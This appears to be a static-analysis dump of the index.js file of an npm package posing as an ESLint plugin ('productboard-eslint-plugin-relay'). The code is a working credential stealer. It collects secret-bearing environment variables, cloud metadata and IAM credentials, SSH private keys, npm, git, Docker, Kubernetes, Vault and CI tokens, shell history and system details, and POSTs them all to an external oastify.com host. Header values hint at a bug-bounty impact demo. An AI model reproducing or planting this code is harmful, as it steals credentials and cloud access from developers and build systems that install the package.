// File: tmp/tmpy22swwmo/productboard-eslint-plugin-relay/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const fs = require("fs")
Line 4: const path = require("path")
Line 5: const https = require("https")
Line 6: const querystring = require("querystring")
Line 7: const child_process = require("child_process")
Line 12: const size = fs.statSync(p).size
Line 14: fs.readFileSync(p, "utf8")
Line 22: (_tmp_0 = fs.readdirSync(p))
Line 30: (_tmp_1 = child_process.execSync(cmd, { timeout }).toString()).trim
Line 38: _iterator_0.next()
Line 39: /pass|key|token|secret|env|auth|cred|aws|gcp|azure|kube|docker|jenkins|gitlab|github|circleci|travis|vault/i.test(key)
Line 40: result[key] = process.env[key]
Line 49: _tmp_7.push({ name: "aws_instance", url: "http://169.254.169.254/latest/dynamic/instance-identity/document" })
Line 50: _tmp_7.push({ name: "aws_iam", url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" })
Line 51: _tmp_7.push({ name: "aws_s3", cmd: "aws s3 ls" })
Line 52: _tmp_7.push({ name: "gcp_metadata", url: "http://metadata.google.internal/computeMetadata/v1/?recursive=true", headers: { "Metadata-Flavor": "Google" } })
Line 53: _tmp_7.push({ name: "gcp_projects", cmd: "gcloud projects list --format=json" })
Line 54: _tmp_7.push({ name: "azure_metadata", url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", headers: { "Metadata": "true" } })
Line 55: _tmp_7.push({ name: "azure_subscriptions", cmd: "az account list --output json" })
Line 57: _iterator_1.next()
Line 59: {
                metadata[name] = exec(cmd);
            }
Line 60: metadata[name] = exec(cmd)
Line 61: {
                let cmd = `curl -s --max-time 2 ${url}`;
                if (headers) {
                    const headerStr = Object.entries(headers).map(([k, v]) => `-H "${k}: ${v}"`).join(" ");
                    cmd = `curl -s --max-time 2 ${headerStr} ${url}`;
                }
                metadata[name] = exec(cmd);
            }
Line 63: {
                    const headerStr = Object.entries(headers).map(([k, v]) => `-H "${k}: ${v}"`).join(" ");
                    cmd = `curl -s --max-time 2 ${headerStr} ${url}`;
                }
Line 64: const headerStr = Object.entries(headers).map(([k, v]) => `-H "${k}: ${v}"`).join(" ")
Line 67: metadata[name] = exec(cmd)
Line 69: catch (e) {
            metadata[name] = `ERR: ${e.message}`;
        }
Line 70: metadata[name] = `ERR: ${e.message}`
Line 74: {
        const roleName = exec("curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/");
        if (roleName && !roleName.startsWith("ERR:")) {
            metadata["aws_iam_creds"] = exec(`curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}`);
        }
    }
Line 75: const roleName = exec("curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/")
Line 76: {
            metadata["aws_iam_creds"] = exec(`curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}`);
        }
Line 77: metadata["aws_iam_creds"] = exec(`curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}`)
Line 79: catch (e) {
        metadata["aws_iam_creds"] = `ERR: ${e.message}`;
    }
Line 80: metadata["aws_iam_creds"] = `ERR: ${e.message}`
Line 86: {
        aws: {
            credentials: safeReadFile(path.join(os.homedir(), ".aws/credentials")),
            config: safeReadFile(path.join(os.homedir(), ".aws/config")),
            ssm_params: exec("aws ssm get-parameters --names / --recursive --query 'Parameters[*].Name'"),
            sts: exec("aws sts get-caller-identity"),
            assume_role: exec("aws sts get-session-token"),
        },
        gcloud: {
            config: safeReadFile(path.join(os.homedir(), ".config/gcloud/configurations/config_default")),
            credentials: safeReadFile(path.join(os.homedir(), ".config/gcloud/credentials.db")),
            service_accounts: exec("gcloud iam service-accounts list --format=json"),
        },
        azure: {
            credentials: safeReadFile(path.join(os.homedir(), ".azure/azureProfile.json")),
            accessTokens: safeReadFile(path.join(os.homedir(), ".azure/accessTokens.json")),
            vm_info: exec("az vm show --query '{id:id...
Line 87: _tmp_19.aws = {
            credentials: safeReadFile(path.join(os.homedir(), ".aws/credentials")),
            config: safeReadFile(path.join(os.homedir(), ".aws/config")),
            ssm_params: exec("aws ssm get-parameters --names / --recursive --query 'Parameters[*].Name'"),
            sts: exec("aws sts get-caller-identity"),
            assume_role: exec("aws sts get-session-token"),
        }
Line 88: safeReadFile(path.join(os.homedir(), ".aws/credentials"))
Line 89: safeReadFile(path.join(os.homedir(), ".aws/config"))
Line 90: _tmp_20.ssm_params = exec("aws ssm get-parameters --names / --recursive --query 'Parameters[*].Name'")
Line 91: _tmp_20.sts = exec("aws sts get-caller-identity")
Line 92: _tmp_20.assume_role = exec("aws sts get-session-token")
Line 94: _tmp_19.gcloud = {
            config: safeReadFile(path.join(os.homedir(), ".config/gcloud/configurations/config_default")),
            credentials: safeReadFile(path.join(os.homedir(), ".config/gcloud/credentials.db")),
            service_accounts: exec("gcloud iam service-accounts list --format=json"),
        }
Line 95: safeReadFile(path.join(os.homedir(), ".config/gcloud/configurations/config_default"))
Line 96: safeReadFile(path.join(os.homedir(), ".config/gcloud/credentials.db"))
Line 97: _tmp_21.service_accounts = exec("gcloud iam service-accounts list --format=json")
Line 99: _tmp_19.azure = {
            credentials: safeReadFile(path.join(os.homedir(), ".azure/azureProfile.json")),
            accessTokens: safeReadFile(path.join(os.homedir(), ".azure/accessTokens.json")),
            vm_info: exec("az vm show --query '{id:id,name:name}' --output json"),
        }
Line 100: safeReadFile(path.join(os.homedir(), ".azure/azureProfile.json"))
Line 101: safeReadFile(path.join(os.homedir(), ".azure/accessTokens.json"))
Line 102: _tmp_22.vm_info = exec("az vm show --query '{id:id,name:name}' --output json")
Line 108: {
        cgroup: safeReadFile("/proc/1/cgroup"),
        dockerenv: fs.existsSync("/.dockerenv"),
        docker_info: exec("docker info --format json"),
        docker_ps: exec("docker ps -a --format '{{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}'"),
        docker_config: safeReadFile(path.join(os.homedir(), ".docker/config.json")),
        kubernetes: {
            token: safeReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token"),
            namespace: safeReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace"),
            kubeconfig: safeReadFile(path.join(os.homedir(), ".kube/config")),
            pods: exec("kubectl get pods -o json --all-namespaces"),
            secrets: exec("kubectl get secrets -o json --all-namespaces"),
        },
    }
Line 109: safeReadFile("/proc/1/cgroup")
Line 110: _tmp_23.dockerenv = fs.existsSync("/.dockerenv")
Line 111: _tmp_23.docker_info = exec("docker info --format json")
Line 112: _tmp_23.docker_ps = exec("docker ps -a --format '{{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}'")
Line 113: safeReadFile(path.join(os.homedir(), ".docker/config.json"))
Line 114: _tmp_23.kubernetes = {
            token: safeReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token"),
            namespace: safeReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace"),
            kubeconfig: safeReadFile(path.join(os.homedir(), ".kube/config")),
            pods: exec("kubectl get pods -o json --all-namespaces"),
            secrets: exec("kubectl get secrets -o json --all-namespaces"),
        }
Line 115: safeReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
Line 116: safeReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
Line 117: safeReadFile(path.join(os.homedir(), ".kube/config"))
Line 118: _tmp_24.pods = exec("kubectl get pods -o json --all-namespaces")
Line 119: _tmp_24.secrets = exec("kubectl get secrets -o json --all-namespaces")
Line 125: {
        github: {
            token: process.env.GITHUB_TOKEN || safeReadFile(path.join(os.homedir(), ".github/token")),
            actions_vars: safeReadDir(path.join(process.cwd(), ".github/workflows")),
        },
        jenkins: {
            config: safeReadFile("/var/jenkins_home/config.xml"),
            credentials: safeReadFile("/var/jenkins_home/credentials.xml"),
        },
        gitlab: {
            config: safeReadFile(path.join(os.homedir(), ".gitlab-ci.yml")),
            token: process.env.CI_JOB_TOKEN || "NOT_FOUND",
        },
        vault: {
            token: safeReadFile(path.join(os.homedir(), ".vault-token")),
            secrets: exec("vault kv list -format=json secret/"),
        },
    }
Line 127: safeReadFile(path.join(os.homedir(), ".github/token"))
Line 128: path.join(process.cwd(), ".github/workflows")
Line 131: safeReadFile("/var/jenkins_home/config.xml")
Line 132: safeReadFile("/var/jenkins_home/credentials.xml")
Line 135: safeReadFile(path.join(os.homedir(), ".gitlab-ci.yml"))
Line 138: _tmp_25.vault = {
            token: safeReadFile(path.join(os.homedir(), ".vault-token")),
            secrets: exec("vault kv list -format=json secret/"),
        }
Line 139: safeReadFile(path.join(os.homedir(), ".vault-token"))
Line 140: _tmp_29.secrets = exec("vault kv list -format=json secret/")
Line 146: {
        node_version: process.version,
        global_objects: Object.keys(global).filter(k => /key|token|secret|cred|auth/i.test(k)),
        process_config: JSON.stringify(process.config),
        npm_config: exec("npm config ls -l"),
        loaded_modules: Object.keys(require("module")._cache).slice(0, 50),
    }
Line 148: /key|token|secret|cred|auth/i.test(k)
Line 150: _tmp_30.npm_config = exec("npm config ls -l")
Line 151: _tmp_30.loaded_modules = Object.keys(require("module")._cache).slice(0, 50)
Line 157: safeReadFile("/etc/passwd")
Line 158: safeReadFile("/etc/hosts")
Line 159: safeReadFile("/etc/resolv.conf")
Line 160: safeReadFile(path.join(os.homedir(), ".bash_history"))
Line 161: safeReadFile(path.join(os.homedir(), ".zsh_history"))
Line 162: safeReadFile(path.join(os.homedir(), ".ssh/config"))
Line 163: safeReadFile(path.join(os.homedir(), ".ssh/id_rsa"))
Line 164: safeReadFile(path.join(os.homedir(), ".ssh/known_hosts"))
Line 165: safeReadFile(path.join(os.homedir(), ".aws/credentials"))
Line 166: safeReadFile(path.join(os.homedir(), ".aws/ssm"))
Line 167: safeReadFile(path.join(os.homedir(), ".npmrc"))
Line 168: safeReadFile(path.join(os.homedir(), ".gitconfig"))
Line 169: safeReadFile(path.join(os.homedir(), ".git-credentials"))
Line 170: safeReadFile(path.join(os.homedir(), ".netrc"))
Line 171: safeReadFile(path.join(os.homedir(), ".docker/config.json"))
Line 173: safeReadFile(path.join(process.cwd(), ".env"))
Line 174: path.join(process.cwd(), ".github/workflows")
Line 175: safeReadFile(path.join(process.cwd(), ".circleci/config.yml"))
Line 180: _tmp_36.push(path.join(os.homedir(), ".config/vault"))
Line 181: _tmp_36.push(path.join(os.homedir(), ".terraformrc"))
Line 182: _tmp_36.push(path.join(process.cwd(), "secrets.yml"))
Line 183: _tmp_36.push("/run/secrets")
Line 186: {
        files.extras[path.basename(p)] = fs.existsSync(p) ? (fs.lstatSync(p).isDirectory() ? safeReadDir(p) : safeReadFile(p)) : "NOT_FOUND";
    }
Line 187: files.extras[path.basename(p)] = fs.existsSync(p) ? (fs.lstatSync(p).isDirectory() ? safeReadDir(p) : safeReadFile(p)) : "NOT_FOUND"
Line 193: {
        whoami: exec("whoami"),
        id: exec("id"),
        ps: exec("ps aux | grep -E 'node|java|python|ruby|go|aws|gcloud|az|kubectl|vault' | head -n 30"),
        netstat: exec("ss -tunlp | head -n 30"),
        lsof: exec("lsof -n -i | head -n 30"),
        uname: exec("uname -a"),
        mounts: exec("cat /proc/mounts | head -n 30"),
        crontab: exec("crontab -l"),
        sysctl: exec("sysctl -a | grep -E 'kernel|vm|net' | head -n 50"),
    }
Line 194: _tmp_39.whoami = exec("whoami")
Line 195: _tmp_39.id = exec("id")
Line 196: _tmp_39.ps = exec("ps aux | grep -E 'node|java|python|ruby|go|aws|gcloud|az|kubectl|vault' | head -n 30")
Line 197: _tmp_39.netstat = exec("ss -tunlp | head -n 30")
Line 198: _tmp_39.lsof = exec("lsof -n -i | head -n 30")
Line 199: _tmp_39.uname = exec("uname -a")
Line 200: _tmp_39.mounts = exec("cat /proc/mounts | head -n 30")
Line 201: _tmp_39.crontab = exec("crontab -l")
Line 202: _tmp_39.sysctl = exec("sysctl -a | grep -E 'kernel|vm|net' | head -n 50")
Line 209: dump = {
        p: (() => {
            try {
                return require("./package.json").name;
            } catch {
                return "unknown";
            }
        })(),
        v: (() => {
            try {
                return require("./package.json").version;
            } catch {
                return "unknown";
            }
        })(),
        c: process.cwd(),
        hd: os.homedir(),
        hn: os.hostname(),
        un: os.userInfo().username,
        dns: (() => {
            try {
                return dns.getServers();
            } catch (e) {
                return [`ERR: ${e.message}`];
            }
        })(),
        pjson: (() => {
            try {
                const pkg = require("./package.json");
                return {
                    name: pkg.name,
                    version: pkg.version,
                    main: pkg.main,
                    keywords: pkg.keywords,
                    s...
Line 210: _tmp_41.p = (() => {
            try {
                return require("./package.json").name;
            } catch {
                return "unknown";
            }
        })()
Line 217: _tmp_41.v = (() => {
            try {
                return require("./package.json").version;
            } catch {
                return "unknown";
            }
        })()
Line 226: os.hostname()
Line 227: os.userInfo()
Line 232: _tmp_42.push(<operator>.formatString("ERR: ", e.message, ""))
Line 235: _tmp_41.pjson = (() => {
            try {
                const pkg = require("./package.json");
                return {
                    name: pkg.name,
                    version: pkg.version,
                    main: pkg.main,
                    keywords: pkg.keywords,
                    scripts: pkg.scripts,
                    author: pkg.author,
                    license: pkg.license,
                    description: pkg.description
                };
            } catch {
                return {};
            }
        })()
Line 237: const pkg = require("./package.json")
Line 254: getCloudMetadata()
Line 255: getCloudCLIs()
Line 267: {
    const postData = querystring.stringify({
        msg: encodeURIComponent(JSON.stringify(dump))
    });

    const options = {
        hostname: "ovnxva4z7pgbompisolekpb83z9qxmlb.oastify.com",
        port: 443,
        path: "/",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": postData.length,
            "User-Agent": "rce-impact-demo",
            "X-Report-ID": "328XXXX"
        },
        timeout: 5000,
    };

    const req = https.request(options, res => {
        res.on("data", () => {});
        res.on("end", () => {});
    });

    req.on("error", () => {});
    req.on("timeout", () => req.destroy());
    req.write(postData);
    req.end();
}
Line 286: const req = https.request(options, res => {
        res.on("data", () => {});
        res.on("end", () => {});
    })
Line 293: req.write(postData)
Line 294: req.end()
